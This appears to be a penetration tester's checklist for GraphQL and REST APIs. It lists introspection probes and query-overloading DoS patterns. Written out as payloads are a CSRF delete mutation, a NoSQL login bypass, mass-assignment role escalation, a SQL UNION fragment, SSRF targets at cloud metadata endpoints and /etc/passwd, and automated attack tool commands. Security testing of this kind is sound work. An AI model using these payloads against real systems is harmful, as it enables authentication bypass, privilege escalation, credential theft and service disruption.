# REST + GraphQL In-Depth Testing

## Complete GraphQL Security Testing Checklist

### Introspection Probing (Three-Tier Fallback)

```graphql
# Level 1 — Standard Introspection
{ __schema { queryType { name } mutationType { name } types { name fields { name type { name } } } } }

# Level 2 — Compact Introspection (WAF Bypass)
{ __schema { types { name } } }

# Level 3 — Minimal Probe
{ __type(name: "Query") { name } }
```

### DoS Attack Vectors

```graphql
# Alias Overloading
query { a1: __typename a2: __typename ... a100: __typename }

# Batch Query Overloading
[query1, query2, ..., query10]

# Circular Query
query { __schema { types { fields { type { fields { type { fields { name } } } } } } } }

# Directive Overloading
query { __typename @skip(if: false) @include(if: true) ... }
```

### Authorization Testing

```graphql
# GET Mutation (CSRF)
GET /graphql?query=mutation+{+deleteUser(id:1)+}

# Batch Query Authentication Bypass
[
  { "query": "query { me { id } }" },
  { "query": "mutation { deleteUser(id: 2) }" }
]
```

## REST API In-Depth Testing

### Method Manipulation Matrix

| Endpoint | GET | POST | PUT | PATCH | DELETE | OPTIONS |
|------|-----|------|-----|-------|--------|---------|
| /users | ✓ Accessible | Test Unauthorized Creation | Test Bulk Overwrite | Test Field Injection | Test Cascading Deletion | Information Disclosure |
| /users/me | Baseline | — | Test Self-Privilege Escalation | Test Field Append | Test Self-Deletion | — |

### Parameter Injection

```json
// NoSQL Injection
{"username": {"$gt": ""}, "password": {"$ne": ""}}

// Mass Assignment
{"email": "user@example.com", "role": "admin", "isAdmin": true}

// Parameter Pollution
GET /api/users?role=user&role=admin

// JSON Array Injection
{"ids": [1, 2, 3]} → {"ids": ["1 UNION SELECT ..."]}
```

### SSRF via API

```
Common SSRF Parameters: webhook_url, callback_url, avatar_url, import_url, 
                         redirect_uri, file_url, proxy_url, image_url
Testing: http://169.254.169.254/latest/meta-data/ (AWS)
         http://metadata.google.internal/ (GCP)
         file:///etc/passwd
```

## Automation Toolchain

### Vespasian (Traffic-Driven Specification Generation)

```bash
# Crawl from headless browser
vespasian crawl --url https://target.com --depth 3

# Import from Burp/HAR
vespasian import --file traffic.har

# Export OpenAPI 3.0 + GraphQL SDL
vespasian export --format openapi3 --output api-spec.yaml
```

### Entropy (LLM Attack Generation)

```bash
# Spec-based automated testing
entropy --spec api-spec.yaml --live --persona all

# Five concurrent personas:
# - malicious_insider: IDOR / Mass Assignment / Privilege Escalation
# - bot_swarm: Rate-Limit Bypass / DoS / Automated Abuse
# - penetration_tester: Injection / Authentication Bypass
# - impatient_consumer: Race Conditions / Error Handling
# - confused_user: Unexpected Inputs / Edge-Case Testing

# CI Mode
entropy --spec api-spec.yaml --ci --watch
```

### api.sh (8-Phase Pipeline)

```bash
# Phase 1-3: GraphQL Recon → Exploit → Brute Force
./api.sh graphql-recon https://target.com/graphql
./api.sh graphql-exploit https://target.com/graphql

# Phase 4: REST Abuse
./api.sh rest-abuse https://target.com/api

# Phase 5: WebSocket
./api.sh ws-test wss://target.com/ws

# Phase 6: SOAP/XXE
./api.sh soap-xxe https://target.com/soap

# Phase 7: Rate-Limit Bypass
./api.sh rate-bypass https://target.com/api

# Phase 8: Schema Harvesting
./api.sh schema-harvest https://target.com
```

Source: OWASP API Top 10, Praetorian Vespasian, Entropy, FireTail GraphQL